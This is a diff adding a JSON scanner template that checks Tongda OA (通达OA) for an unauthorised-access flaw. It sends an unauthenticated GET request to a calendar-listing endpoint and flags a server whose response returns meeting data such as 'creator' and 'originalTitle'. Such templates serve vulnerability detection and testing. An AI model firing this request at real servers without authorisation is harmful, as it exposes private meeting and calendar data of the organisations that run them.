@@ -1,0 +1,37 @@
+{
+    "Name": "通达oa-meeting-unauthorized-access",
+    "Description": "通达oa-meeting-unauthorized-access",
+    "Product": "通达oa",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Accept-Encoding":"deflate"},
+        "Uri":"/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "creator"
+                },
+                {
+                 "Operation": "contains", 
+                 "Key":"",
+                 "Value": "originalTitle"
+                 },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+            ]}
